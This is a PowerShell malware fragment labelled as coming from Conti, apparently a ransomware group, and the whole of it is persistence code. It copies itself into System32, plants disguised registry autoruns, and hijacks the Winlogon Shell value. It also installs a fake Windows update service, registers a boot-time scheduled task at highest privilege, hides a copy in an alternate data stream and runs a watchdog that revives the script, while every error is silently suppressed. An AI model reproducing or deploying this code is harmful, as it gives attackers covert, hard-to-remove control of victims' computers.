<#From Conti#>
try {
        # Copy the script to System32 with the new name
        Copy-Item $PSCommandPath $scriptNewPath -Force -ErrorAction SilentlyContinue

        # 1. Multiple Registry Autoruns with obfuscated names
        $regPaths = @(
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        )
        $regNames=@("SysUpdateCheck", "WindowsEnhancer", "UserInitHelper")
        $regValue="powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptNewPath`" -HiddenRun"
        foreach ($path in $regPaths) {
            $name=$regNames | Get-Random
            Set-ItemProperty -Path $path -Name $name -Value $regValue -Force -ErrorAction SilentlyContinue
        }
        # 2. Winlogon Notify Hook for immediate boot execution
        $winlogonPath="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        Set-ItemProperty -Path $winlogonPath -Name "Shell" -Value "explorer.exe,powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptNewPath`" -HiddenRun" -Force -ErrorAction SilentlyContinue

        # 3. Install as a Service
        $svCName="WindowsUpdateSvc"+(Get-Random -Minimum 1000 -Maximum 9999)
        $svCArgs="-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptNewPath`" -HiddenRun"
        New-Service -Name $svCName -BinaryPathName "powershell.exe $svcArgs" -StartupType Automatic -Description "Critical system update service" -ErrorAction SilentlyContinue
        Set-Service -Name $svCName -StartupType Automatic
        sc.exe config $svCsName start= auto -ErrorAction SilentlyContinue

        # 4. Immediate Startup Scheduled Task
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptNewPath`" -HiddenRun"
        $trigger = New-ScheduledTaskTrigger -AtStartup # Runs immediately after system boot
        Register-ScheduledTask -TaskName "SystemBootExec" -Action $action -Trigger $trigger -RunLevel Highest -Force -ErrorAction SilentlyContinue

        # 5. Hide in Alternate Data Streams
        $adsPath = "$env:SYSTEMROOT\System32\config\systemprofile:evilstream.ps1"
        Get-Content $PSCommandPath | Set-Content -Path $adsPath -ErrorAction SilentlyContinue

        # 6. Watchdog Process
        $watchdogScript = @"
        while ($true) {
            if (-not (Test-Path '$scriptNewPath') -or -not (Get-Process | Where-Object { `$_.Path -eq '$scriptNewPath' })) {
                Copy-Item '$adsPath' '$scriptNewPath' -Force -ErrorAction SilentlyContinue
                Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptNewPath`" -HiddenRun' -NoNewWindow -ErrorAction SilentlyContinue
            }
            Start-Sleep -Seconds 5
        }
"@
        $watchdogPath = "$env:SYSTEMROOT\Temp\watchdog-$randomSuffix.ps1"
        $watchdogScript | Out-File $watchdogPath -Encoding UTF8
        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchdogPath`"" -NoNewWindow -ErrorAction SilentlyContinue
    }
    catch {
        # Keep going silently
    }